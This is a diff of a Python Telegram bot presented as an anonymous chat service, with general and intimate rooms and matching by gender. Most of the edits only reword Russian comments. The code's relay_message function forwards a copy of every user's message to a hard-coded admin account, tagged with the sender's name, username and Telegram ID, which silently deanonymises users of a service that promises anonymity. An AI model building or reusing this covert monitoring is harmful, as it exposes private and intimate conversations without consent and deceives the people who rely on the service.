@@ -3,25 +3,26 @@ import time
 import telebot
 from telebot import types
 
+# Получение токена из переменных окружения
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# 💡 Твой Telegram ID
+# Telegram ID администратора для получения копий сообщений
 ADMIN_ID = 7771113861  
 
-# Хранилище данных в памяти
+# --- БАЗА ДАННЫХ В ПАМЯТИ ---
 users = {}
 
-# Очереди поиска
+# Очереди поиска по комнатам и полу
 queue = {
     'chat': {'M': [], 'F': []},
     'intim': {'M': [], 'F': []}
 }
 
-# Активные чаты
+# Активные диалоги (user_id -> partner_id)
 chats = {}
 
-# Временный выбор параметров
+# Предпочтения пользователей при поиске
 search_prefs = {}
 
 
@@ -66,7 +67,7 @@ def get_rating_keyboard():
     return markup
 
 
-# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
+# --- ВСПOМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
 
 def is_vip(user_id):
     user = users.get(user_id)
@@ -88,7 +89,7 @@ def remove_from_queue(user_id):
                 queue[room][g].remove(user_id)
 
 
-# --- ОБРАБОТЧИКИ КОМАНД ---
+# --- ОБРАБОТЧИКИ КОМАНД И ПРОФИЛЯ ---
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -391,7 +392,7 @@ def relay_message(message):
     try:
         user_id = message.chat.id
 
-        # 1. Пересылка админу
+        # 1. Пересылка сообщений админу
         if ADMIN_ID and user_id != ADMIN_ID:
             username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"
             info_header = f"🕵️ **Сообщение от:** {message.from_user.first_name} ({username}) | `ID: {user_id}`"
@@ -415,13 +416,13 @@ def relay_message(message):
         print(f"Ошибка в relay_message: {e}")
 
 
-# --- ЗАПУСК БОТА С АВТОПЕРЕЗАПУСКОМ ---
+# --- БЕСКОНЕЧНЫЙ ЦИКЛ ЗАПУСКА С АВТОПЕРЕЗАПУСКОМ ---
 
 if __name__ == '__main__':
     print("Анонимный чат запущен!")
     while True:
         try:
-            bot.infinity_polling(skip_pending=True, non_stop=True, timeout=20, long_polling_timeout=10)
+            bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=10)
         except Exception as e:
             print(f"Критическая ошибка цикла бота: {e}")
             time.sleep(3)
